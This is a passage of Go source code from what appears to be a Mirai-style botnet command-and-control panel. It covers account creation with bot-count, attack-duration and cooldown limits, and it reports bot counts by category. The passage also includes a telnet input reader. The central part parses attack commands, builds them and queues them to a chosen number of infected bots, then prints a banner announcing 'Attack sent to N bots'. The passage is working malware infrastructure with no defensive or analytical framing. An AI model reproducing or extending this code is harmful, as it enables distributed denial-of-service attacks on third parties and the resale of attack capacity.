			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m-\x1b[38;5;99m>\x1b[38;5;99m \x1b[38;5;99m%s\x1b[38;5;99m\r\n", "Failed To Parse The Bot Count")))
				continue
			}
			this.conn.Write([]byte("\x1b[38;5;99m-\x1b[38;5;99m>\x1b[38;5;99m Max Attack Duration (-1 For None): "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m-\x1b[38;5;99m>\x1b[38;5;99m \x1b[0;37%s\x1b[38;5;99m\r\n", "Failed To Parse The Attack Duration Limit")))
				continue
			}
			this.conn.Write([]byte("\x1b[38;5;99m-\x1b[38;5;99m>\x1b[38;5;99m Cooldown Time (0 For None): "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m-\x1b[38;5;99m>\x1b[38;5;99m \x1b[38;5;99m%s\x1b[38;5;99m\r\n", "Failed To Parse The Cooldown")))
				continue
			}
			this.conn.Write([]byte("\x1b[38;5;99m-\x1b[38;5;99m>\x1b[38;5;99m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nDuration: " + duration_str + "\r\nCooldown: " + cooldown_str + "\r\nContinue? (Y/N): "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m-\x1b[38;5;99m>\x1b[38;5;99m \x1b[38;5;99m%s\x1b[38;5;99m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
			} else {
				this.conn.Write([]byte("\x1b[38;5;99m-\x1b[38;5;99m>\x1b[38;5;99m User Added Successfully.\x1b[38;5;99m\r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && cmd == "count" || cmd == "bots" || cmd == "Bots" {
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m%s: \x1b[38;5;27m%d\x1b[38;5;99m\r\n\x1b[38;5;99m", k, v)))
			}
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99mTotal botcount: \x1b[38;5;27m%d\r\n\x1b[38;5;99m", botCount)))
			continue
		}
		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99mFailed To Parse Botcount \"%s\"\x1b[38;5;99m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99mBot Count To Send Is Bigger Than Allowed Bot Maximum\x1b[38;5;99m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}
		if cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m%s\x1b[38;5;99m\r\n", err.Error())))
		} else {
			if database.fetchRunningAttacks() >= 1 {
				this.conn.Write([]byte("\x1b[38;5;99mslots is full !\r\n"))
			} else { // Hanya lanjutkan jika tidak ada serangan berjalan
				buf, err := atk.Build()
				if err != nil {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m%s\x1b[38;5;99m\r\n", err.Error())))
				} else {
					if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
						this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99m%s\x1b[38;5;99m\r\n", err.Error())))
					} else if !database.ContainsWhitelistedTargets(atk) {
						clientList.QueueBuf(buf, botCount, botCatagory)
						this.conn.Write([]byte("\033[2J\033[1H"))
						this.conn.Write([]byte("\x1b[38;5;99m╔══════════════════════════════════════════════════╗\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣏⡿⣹⢞⡳⣭⡛⡿⢎⡷⢯⣽⣛⡿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║   \r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⠻⡒⠧⢣⠹⠴⠡⠎⠜⡠⢝⡐⣣⠜⣃⠚⣭⢳⡹⣏⡿⣽⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║  \r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⡥⢋⠤⢓⣠⠊⢐⣤⢂⣐⠀⠓⠈⠁⣉⣂⣉⠒⢙⣊⡁⢋⠱⣙⣞⣹⢟⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║ \r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣿⣿⣿⣿⡿⢛⡔⢢⡌⢤⣟⠀⠀⡨⠆⠉⠉⠉⣉⠍⢉⡽⠋⠉⠉⡟⠏⠉⡉⢛⡟⣏⡛⢟⣫⢛⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿║ \r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣿⣿⣿⣏⣑⣣⢴⣳⢦⣾⣭⣶⣼⣯⠭⠿⣾⣭⠽⣍⣿⣾⣭⣖⣫⢟⣙⣦⣤⢤⣐⣨⣉⣯⣙⣻⣻⣾⣻⣿⣿⣿⣿⣿⣿⣿⣿║ \r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣿⣿⠿⣖⣻⠟⢿⣝⠛⠉⠉⣉⣑⣩⣉⣉⣉⡌⠉⠈⢁⣀⡬⠩⠍⠁⠉⠌⠡⣭⠍⣈⠹⣛⠯⣙⣻⣝⠿⣿⣿⣿⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣿⣟⣿⣿⣿⣯⡹⣞⣋⣧⣿⣷⠿⢦⣔⠳⣾⣛⠿⣿⣿⡧⢤⣴⣤⣶⣶⣤⣶⡾⣿⣻⣩⣿⣻⡽⣿⣾⣽⣽⣿⣿⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⢿⣿⣿⣯⡿⣿⣿⣿⣟⣳⣾⠻⣿⣿⣿⣿⣿⣏⡷⠬⡿⣽⣻⣍⣿⣶⣿⣿⣯⣿⣛⣿⣿⣿⣿⣿⣮⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⠹⢇⣨⠿⠉⠉⠉⢉⡨⠔⠋⠃⠈⠉⠀⠀⠀⠈⠀⠀⠀⠀⠁⠈⠋⠉⠁⠁⠈⠁⠁⠀⠀⠉⠀⠠⠘⢛⠛⣻⢻⣿⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⠐⠊⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢀⠉⡖⢯⢾⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⠐⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⢀⠀⠀⠀⢀⣀⡀⠀⡀⠀⠀⠀⠀⠀⠀⡀⢀⣀⠀⠀⠀⡀⢀⢀⡀⠀⠈⠠⠑⢺⣼⣻⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣰⣴⣾⡿⣿⣿⣟⣿⠿⣿⣻⣽⣿⠟⠛⣛⠿⢛⡛⠛⢉⠽⢛⢛⣛⠻⣋⣽⣻⢿⣿⣻⣿⣟⣻⣟⣻⣿⣻⣿⢟⣷⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣛⠾⢿⣟⣿⣅⡼⣇⣠⣠⠟⡟⣡⡶⢋⣁⣔⣎⡙⠷⣶⣒⡶⢾⡛⣷⣿⡿⢞⣿⣟⣁⣿⢿⣿⣛⣩⣯⣿⣵⣿⣿⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣯⢿⣟⠟⠿⠿⠷⠛⠛⠙⠛⠷⣿⣁⣿⣷⣾⣽⣿⣆⠉⠛⠛⠛⠛⠋⠛⠙⠛⠯⠟⠛⠉⠋⠻⠿⠿⣟⡻⣻⢿⣿⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣿⣶⠈⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠛⠋⠁⠀⠀⠀⣀⣀⡀⡀⢀⣠⣤⠀⠀⠀⠀⠀⢠⠰⣨⢝⣽⣿⣿⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣿⣿⣧⠄⢂⢀⡀⠀⡀⣀⡀⠐⣂⣀⣀⣘⣠⣀⣠⣀⣀⣤⣤⣌⣛⣙⣴⣿⣭⠟⢣⣄⣀⣠⣶⢠⣑⢦⣟⣾⣿⣿⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣿⣿⣿⣿⣯⡍⢿⡛⡿⣽⣟⣻⣵⡤⣵⣮⠥⣤⠵⢶⣥⠴⣌⣱⣶⠿⣼⣉⡷⢟⠫⡏⣟⣋⣷⣻⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣿⣿⣿⣿⣷⣿⣶⣩⠔⡤⢂⠅⠬⠀⠄⠄⡂⠠⠄⡀⠒⠢⠄⠀⠄⠤⡄⠛⠄⣎⠶⡼⢶⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣶⣱⢪⣔⣢⢆⡴⣠⣡⡂⠴⣡⠤⢤⣐⢆⡴⢤⡱⣤⠶⣭⢶⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣳⣞⣶⣳⣶⣛⣷⣳⣞⡵⣞⣾⣼⣳⣽⣾⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣽⣾⣷⣯⣿⣿⣾⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║\r\n"))
						this.conn.Write([]byte("\x1b[38;5;99m╚══════════════════════════════════════════════════╝\r\n"))
						this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;99mAttack sent to %d bots\r\n", botCount)))
					} else {
						fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
					}
				}
			}
		}

	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
